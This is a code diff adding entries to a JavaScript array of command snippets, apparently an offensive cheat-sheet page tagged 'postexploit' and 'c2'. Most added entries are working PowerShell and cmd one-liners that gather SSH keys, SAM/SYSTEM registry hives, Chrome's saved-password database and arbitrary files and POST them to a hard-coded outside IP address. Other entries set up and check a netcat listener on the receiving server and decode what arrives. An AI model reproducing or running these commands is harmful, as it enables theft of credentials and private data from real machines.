@@ -1979,6 +1979,66 @@ const COMMANDS = [
     tags: ["cmd", "postexploit"],
     accent: "#ff9800"
   },
+  {
+    title: "Exfil SSH Keys to VPS",
+    code: "$k = Get-ChildItem C:\\\\Users\\\\*\\\\.ssh\\\\* -EA SilentlyContinue | Get-Content -Raw; IWR -Uri 'http://168.144.166.97:8080/keys' -Method POST -Body $k",
+    tags: ["ps", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "Exfil SSH Keys with Paths",
+    code: "Get-ChildItem C:\\\\Users\\\\*\\\\.ssh\\\\* -EA SilentlyContinue | ForEach-Object { \"=== $($_.FullName) ===`n$(Get-Content $_ -Raw)\" } | Out-String | % { IWR -Uri 'http://168.144.166.97:8080/keys' -Method POST -Body $_ }",
+    tags: ["ps", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "Check VPS Receiver Running",
+    code: "ss -tlnp | grep 8080",
+    tags: ["linux", "c2", "recon"],
+    accent: "#00ff41"
+  },
+  {
+    title: "View Received Reports",
+    code: "ls -la /opt/reports/ && cat /opt/reports/*.txt",
+    tags: ["linux", "c2"],
+    accent: "#00ff41"
+  },
+  {
+    title: "Start Simple NC Receiver",
+    code: "nc -lvnp 8080 | tee received.txt",
+    tags: ["linux", "c2"],
+    accent: "#00ff41"
+  },
+  {
+    title: "Exfil File Base64 (Any File)",
+    code: "$f='C:\\\\path\\\\to\\\\file'; $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes($f)); IWR -Uri 'http://168.144.166.97:8080/exfil' -Method POST -Body $b",
+    tags: ["ps", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "Exfil SAM/SYSTEM Hashes",
+    code: "reg save HKLM\\\\SAM C:\\\\Windows\\\\Temp\\\\s1; reg save HKLM\\\\SYSTEM C:\\\\Windows\\\\Temp\\\\s2; $d=(Get-Content C:\\\\Windows\\\\Temp\\\\s1,C:\\\\Windows\\\\Temp\\\\s2 -Raw -Encoding Byte); IWR -Uri 'http://168.144.166.97:8080/hashes' -Method POST -Body $d",
+    tags: ["ps", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "Exfil Chrome Passwords DB",
+    code: "copy \"$env:LOCALAPPDATA\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\" C:\\\\Windows\\\\Temp\\\\c.db; $b=[IO.File]::ReadAllBytes('C:\\\\Windows\\\\Temp\\\\c.db'); IWR -Uri 'http://168.144.166.97:8080/chrome' -Method POST -Body $b",
+    tags: ["ps", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "Decode Base64 on VPS",
+    code: "cat received.txt | base64 -d > decoded_file",
+    tags: ["linux", "c2"],
+    accent: "#00ff41"
+  },
+  {
+    title: "Exfil via Certutil (Alt)",
+    code: "certutil -encode C:\\\\secret.txt C:\\\\Windows\\\\Temp\\\\enc.txt && type C:\\\\Windows\\\\Temp\\\\enc.txt | curl -X POST -d @- http://168.144.166.97:8080/data",
+    tags: ["cmd", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
 ];
 
 const list = document.getElementById('cmdList');
